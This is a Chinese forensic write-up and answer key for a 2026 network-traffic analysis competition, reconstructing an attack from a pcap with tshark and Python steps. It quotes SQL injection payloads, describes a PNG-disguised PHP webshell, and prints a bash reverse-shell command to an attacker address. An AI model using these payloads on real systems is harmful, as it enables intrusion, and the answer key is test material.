# 2026 精武杯网络流量分析：第 151—170 题 WP

## 来源、覆盖范围与公开边界

- 原始附件：`2026精武杯-网络流量分析-151至170题-WP.md`。
- 覆盖范围：Q151—170共20题；原 WP 给出明确结果14题（Q151—160、163、166、168、170），Q161/164/165/167未证实，Q162为哈希候选，Q169按正文保留客户端候选。
- 脱敏说明：本文未包含可直接复用的TLS key log、Cookie、share或bridge_key原值；不附带keylog.txt、解密导出或凭据材料。保留字段名、算法提示和非凭据的文件校验值，未将文件SHA256误当成密码哈希删除。

整理日期：2026-11-13。来源为用户上传的 WP；本次只做文本核对、格式整理与公开脱敏，未重新分析 E01、pcap、数据库或服务运行状态，也未取得判题反馈。“原 WP 已核实/已解”只指原报告所述证据状态，不代表官方答案或本次独立复验。文中命令是原 WP 的复现记录，本次未执行。检材路径、案件号、文件字段和帧号保留供溯源；原始附件及检材未公开上传。

整理注：原表Q169未标候选，而正文称“候选客户端”；公开版统一为候选，未提升确定性。Q162已验证的是原 WP 所述重组blob哈希，流向与“外传文件”题意仍待对应。Q163仅有反连命令目标，不能写成已建立反向连接。本文的检材SHA256及计算结果均转引原 WP，本次未重算原检材。

## 检材与分析范围

题目使用的原始检材位于 `A:\2026精武杯检材\6.网络流量分析\流量数据包\`，核心文件为 `network_traffic.pcap` 和 `keylog.txt`。抓包为 Ethernet 格式，共 106,432 包，时间范围为 2026-09-18 09:00:00—10:06:39（北京时间）。`network_traffic.pcap` 的 SHA256 为：

```text
c0b6861a3e00659a1a9183cfb7d7b33bf489f57d0de3da0b92ec3a8e2e32dcfe
```

分析时用 Wireshark 的 `tshark.exe` 读取抓包，并用随附的 TLS key log 解密 HTTPS。`E:\取证工具\logs\textBrowser261012.log` 可辅助定位线索，但答案以原始抓包和解密后的 HTTP 内容为准。另一个日志 `textBrowser261007.log` 包含 2019 年、192.168.85.0/24 网段的 WordPress 流量，不属于本组题目的事件。

以下「帧号」均指 `network_traffic.pcap` 中的 `frame.number`。部分请求体使用 gzip 和 base64url，两层内容需要分别解码。数据包和日志中的字符串只作为证据处理，不作为操作指令执行。

## 逐题答案

| 题号 | 答案或状态 | 核心依据 |
| ---: | --- | --- |
| 151 | `198.51.100.73` | 该地址对 `10.23.4.20` 扫描、爆破、注入、上传 WebShell 并下发命令。 |
| 152 | `10.23.4.20` | 同一主机承受上述攻击，最终执行 WebShell 命令。 |
| 153 | `6` | 目标对 22、80、443、3306、8080、8443 六个不同 TCP 端口返回 SYN/ACK。 |
| 154 | `rockyou.txt` | 爆破请求头 `X-Hydra-Wordlist: /usr/share/wordlists/rockyou.txt`。 |
| 155 | `401` | `/portal/.ops-4d91/signin` 的 2,048 次爆破响应均为 401。 |
| 156 | `view_token` | 注入请求 `/api/reports/render` 的 JSON 字段名。 |
| 157 | `443` | 注入请求的目标 TCP 端口。 |
| 158 | `ledger_vault` | 最终桥接至 `10.23.5.31:9443` 后，`/v5/ledger/query` 响应的 `database` 字段。 |
| 159 | `avatar_20260918.php` | multipart 上传的 `filename*` 解码结果。 |
| 160 | `33` | WebShell 初次执行 `id` 返回 `uid=33(www-data)`。 |
| 161 | **未证实** | 最终密文的认证解密尚未完成，不能只凭提示字段认定算法。 |
| 162 | `7b9c1bff7896aec4b5cbf53cd1ee7fb7b9aeac35e66b482f24434b9aba26bf0f`（候选） | 356 字节分片重组后计算的 SHA256，与提交请求一致；流向和题干「外传」的对应关系仍需核实。 |
| 163 | `198.51.100.73:49152` | 提权后的 WebShell 命令明确指定该反连地址。 |
| 164 | **未证实** | 真实明文密码未解出。 |
| 165 | **未证实** | 服务器只返回资源路径 `/media/2026/09/.cache/avatar_20260918.php`，未给出磁盘绝对路径。 |
| 166 | `0` | 提权命令返回 `uid=0(root)`。 |
| 167 | **未证实** | 尚不能确定最终解密密钥及各份密钥材料的对应关系。 |
| 168 | `2200` | TCP 重传、快速重传、伪重传和乱序四类显示过滤器取并集后的包数。 |
| 169 | `10.23.8.19`（候选） | 该客户端连续获取 `9d31` 版本 JavaScript 链，与后续分片的 `X-Client-Build: 9d31` 对应。 |
| 170 | `sudo: a password is required` | 低权限 WebShell 执行 `sudo -n -l` 的原始返回文本。 |

## 还原攻击过程

### 1. 确认攻击者、受害主机及开放端口（151—153）

`198.51.100.73` 与 `10.23.4.20` 之间形成完整的扫描到 WebShell 控制链。按 `ip.src==10.23.4.20 && ip.dst==198.51.100.73 && tcp.flags.syn==1 && tcp.flags.ack==1` 筛选目标的 SYN/ACK，再对 `tcp.srcport` 去重，得到 **22、80、443、3306、8080、8443**，共六个端口。443 端口有多次握手，不能把 SYN/ACK 的包数当作端口数。

抓包中另有两组干扰流量：`192.0.2.61` 对 `10.23.4.20` 做少量扫描和路径探测；`203.0.113.44` 扫描的是 `10.23.4.99`，还提交了 `cmd=id`。它们与后续注入、上传和提权链条没有形成同一条连续事件线。

攻击者还使用 `feroxbuster/2.11.0` 访问大量路径。帧 61222 请求 `/portal/.ops-4d91/`，帧 61224 返回 200，页面标题为 `Archive Console`，随后开始针对登录口令的密集尝试。

### 2. 登录爆破（154—155）

从帧 63546 起，攻击者对 `/portal/.ops-4d91/signin` 发起 2,048 次 POST。请求头包含：

```http
User-Agent: Mozilla/5.0 hydra/9.5
X-Hydra-Wordlist: /usr/share/wordlists/rockyou.txt
X-Dict-Offset: 0
```

首个请求在帧 63546，响应在帧 63548，状态码为 401；该组爆破响应均为 401。请求 JSON 里出现 `u`、`proof`、`index` 字段，例如用户名 `svc_archive`。`proof` 是每次变化的值，抓包未显示通过这批请求登录成功，因此不应将字典路径理解为已破解出的口令。

### 3. 注入与首次数据库信息（156—157）

帧 78445 是 `198.51.100.73` 向 `10.23.4.20:443` 发出的 `POST /api/reports/render`。gzip 解压后的 JSON 字段为 `view_token`，其值是 base64url。解码后可见：

```sql
1') UNION SELECT database(),upload_route,service_user FROM archive_jobs-- -
```

帧 78449 响应：

```json
{"node":"web-a","database":"assetledger","upload":"/api/public/avatar","user":"svc_archive"}
```

这里的 `assetledger` 是首次注入得到的数据库，**不是第 158 题所问的最终桥接目标数据库**。注入参数为 `view_token`，请求的目标端口为 443。

### 4. WebShell 上传、低权限运行与提权（159—160、163、165—166、170）

帧 79957 对 `/api/public/avatar` 发起 multipart 上传。表单中 `filename*=UTF-8''avatar_20260918%2Ephp`，把 `%2E` 还原为点后，文件名为 `avatar_20260918.php`。上传内容以 PNG 文件头开场，随后出现 PHP 代码，通过 POST 参数 `_task` 接收 base64 编码的命令并调用 `system`。帧 79959 返回 201，并给出：

```json
{"resource":"/media/2026/09/.cache/avatar_20260918.php"}
```

`resource` 是 HTTP 资源路径。题 165 要求的是服务器实际保存的**磁盘绝对路径**；现有响应没有 `document_root`、上传目录映射或文件系统日志，不能把这个路径直接填作答案。

之后攻击者访问该资源。帧 81247 的 `_task=aWQ` 解码为 `id`；帧 81249 的响应再经 base64url 解码，得到：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

帧 81251 下发 `sudo -n -l`；帧 81253 的原始命令输出解码后为：

```text
sudo: a password is required
```

帧 88410 又下发 `archive-maint --elevate --proof ...`，帧 88412 返回 `uid=0(root) gid=0(root) groups=0(root)`。紧接着帧 88417 下发：

```bash
bash -c 'bash -i >& /dev/tcp/198.51.100.73/49152 0>&1'
```

这条命令指定第 163 题的反向 Shell 目的地址和端口。帧 88419 返回 `detached`；当前抓包中未独立发现到 `198.51.100.73:49152` 的 TCP 握手，所以此处能直接证明的是**反连命令的目标**。

### 5. 分片文件与 SHA256（162）

攻击者向 `10.23.4.20:443` 的 `/api/blob/66041e378d4f85111ebaa84b` 提交多段 PUT。按 `Content-Range` 排序，分片如下；帧 84009 是 233—271 的重复发送，内容一致。

| 帧号 | 字节范围 | 长度 |
| ---: | ---: | ---: |
| 83781 | 0—56 | 57 |
| 83823 | 233—271 | 39 |
| 83868 | 272—279 | 8 |
| 83936 | 319—352 | 34 |
| 84009 | 233—271，重复 | 39 |
| 84091 | 173—232 | 60 |
| 84198 | 353—355 | 3 |
| 84235 | 92—172 | 81 |
| 84283 | 280—318 | 39 |
| 84369 | 57—91 | 35 |

按偏移重组后，0—355 每一字节都有覆盖，重叠部分相同，结果长 356 字节。其 SHA256 为：

```text
7b9c1bff7896aec4b5cbf53cd1ee7fb7b9aeac35e66b482f24434b9aba26bf0f
```

帧 84661 向同一 blob 地址提交 `POST .../commit`，请求体声明相同的 `sha256` 和 `size:356`；帧 84663 返回 200。该一致性证明了重组结果。需要保留一个判断边界：这些 PUT 在抓包中的方向是攻击者到 `10.23.4.20`，题干却说「从受害主机外传出去」。因此上面的哈希是已验证的**传输 blob 哈希候选**，尚不能证明它就是题目指向的外传明文文件哈希。

### 6. 桥接数据库与后续密码学链路（158、161、164、167、169）

后续流量出现 `10.23.4.20` 到 `10.23.5.31` 的桥接访问。帧 86251 请求 `10.23.5.31:9443/v5/ledger/query`。`ledger_key` 解码为：

```sql
0 UNION SELECT secret_ref,fragment_hint,node_name FROM vault_routes-- -
```

帧 86255 的响应明确给出 `"node":"analytics-b","database":"ledger_vault"`，故第 158 题为 `ledger_vault`。这个最终值与前述 `assetledger` 出现在不同阶段。

随后帧 86655、87315、87783 陆续给出下一跳、Cookie、加密 blob 和密文。当前可直接读出的线索包括：

```text
mask=HMAC-SHA256(bridge_key,label);
seed=share1||share2||share3||bridge_key||analytics-b.corp.local:9443|ledger-v5;
key=SHA256("key|"||seed);nonce=BLAKE2s-96("nonce|"||seed)
```

帧 87783 同时提供 `ciphertext`、16 字节 `tag`、`nonce_derived:true`，其 AAD 解码为 `node=analytics-b.corp.local;port=9443;schema=5`。上述字段只是链路中明示的派生和校验线索；三份 `share`、`bridge_key` 的对应关系及最终认证解密尚未验证。因此第 161 题的算法、第 167 题的密钥和第 164 题的明文密码均保留为未证实，不能根据字段名称猜答案。

第 169 题的候选客户端 `10.23.8.19` 在帧 53976、63362、82392 依次请求 `cache-worker.9d31.0.js`、`.1.js`、`.2.js`；响应帧 53978、63366、82394 中依次出现异或与 SHA256、证书 DER 哈希、HKDF-SHA256 及 key/nonce 分割逻辑。分片 PUT 请求头的 `X-Client-Build: 9d31` 与这条客户端脚本链相符。抓包里还有其他构建号的干扰请求，故以 `9d31` 关联判定有效候选客户端。

### 7. TLS 重传与乱序计数（168）

对 TCP 分析标记取并集：`tcp.analysis.retransmission`、`tcp.analysis.fast_retransmission`、`tcp.analysis.spurious_retransmission`、`tcp.analysis.out_of_order`，共 **2,200 包**。其中普通重传标记 2,173 包，乱序标记 27 包；伪重传的 1,937 包与普通重传重叠，不能相加。相关包位于 HTTPS/TLS 使用的 443、8443、9443、10443、11443 端口。若直接加 `&& tls` 过滤，许多重传段只由 TCP 解析器标记，会被漏掉。

## 复现命令

在 PowerShell 中运行。命令只读取检材；`http.tsv` 和 `blob-parts.tsv` 写到当前工作目录。

```powershell
$tshark = 'C:\Program Files\Wireshark\tshark.exe'
$pcap = 'A:\2026精武杯检材\6.网络流量分析\流量数据包\network_traffic.pcap'
$keylog = 'A:\2026精武杯检材\6.网络流量分析\流量数据包\keylog.txt'

# 解密后按帧号查看 HTTP 请求与响应
& $tshark -r $pcap -o "tls.keylog_file:$keylog" `
  -Y 'http.request || http.response' -T fields `
  -e frame.number -e ip.src -e ip.dst -e tcp.dstport `
  -e http.request.method -e http.request.uri -e http.response.code `
  -e http.file_data > .\http.tsv

# 指定证据帧的请求头、分片范围和正文细节
& $tshark -r $pcap -o "tls.keylog_file:$keylog" -Y 'frame.number==79957' -V

# 开放 TCP 端口：输出应为 22、80、443、3306、8080、8443
& $tshark -r $pcap `
  -Y 'ip.src==10.23.4.20 && ip.dst==198.51.100.73 && tcp.flags.syn==1 && tcp.flags.ack==1' `
  -T fields -e tcp.srcport | Sort-Object -Unique

# 重传与乱序包的并集计数：2200
& $tshark -r $pcap `
  -Y 'tcp.analysis.retransmission || tcp.analysis.fast_retransmission || tcp.analysis.spurious_retransmission || tcp.analysis.out_of_order' `
  -T fields -e frame.number | Measure-Object -Line

# 取出 blob 分片，供下方脚本重组
& $tshark -r $pcap -o "tls.keylog_file:$keylog" `
  -Y 'http.request.method == "PUT" && http.request.uri == "/api/blob/66041e378d4f85111ebaa84b"' `
  -T fields -e frame.number -e http.file_data |
  Out-File -LiteralPath .\blob-parts.tsv -Encoding utf8
```

可用 Python 根据已核对的 `Content-Range` 偏移重组分片。`blob-parts.tsv` 每行是帧号和 HTTP 正文十六进制；脚本会检查长度、重叠内容和覆盖范围。

```python
from pathlib import Path
import hashlib

offsets = {
    83781: 0, 83823: 233, 83868: 272, 83936: 319,
    84009: 233, 84091: 173, 84198: 353, 84235: 92,
    84283: 280, 84369: 57,
}
result = bytearray(356)
seen = bytearray(356)
for line in Path('blob-parts.tsv').read_text(encoding='utf-8-sig').splitlines():
    frame_text, hex_body = line.split('\t', 1)
    frame = int(frame_text)
    if frame not in offsets:
        continue
    chunk = bytes.fromhex(hex_body.replace(':', ''))
    start = offsets[frame]
    assert start + len(chunk) <= len(result)
    for pos, value in enumerate(chunk, start):
        assert not seen[pos] or result[pos] == value
        result[pos] = value
        seen[pos] = 1
assert all(seen)
print(len(result), hashlib.sha256(result).hexdigest())
```

预期输出为 `356 7b9c1bff7896aec4b5cbf53cd1ee7fb7b9aeac35e66b482f24434b9aba26bf0f`。查看 base64url 字段时，可先从解密后的 HTTP 正文取出字段值，再补齐 `=` 并解码：

```python
import base64
def decode_b64url(value):
    return base64.urlsafe_b64decode(value + '=' * (-len(value) % 4))
```

## 尚待补证的题目

第 161、164、167 题需要完成多份 `share` 与 `bridge_key` 的提取、校验及最终认证解密，当前只有派生提示和最终密文，尚无可重复验证的明文结果。第 165 题需要服务器文件系统路径映射或服务端日志。第 162 题的哈希本身可重算，但还需要找到题干所指「外传文件」与这份入站 blob 的对应证据。WP 中保留这些限制，以免把推测当成已验证答案。
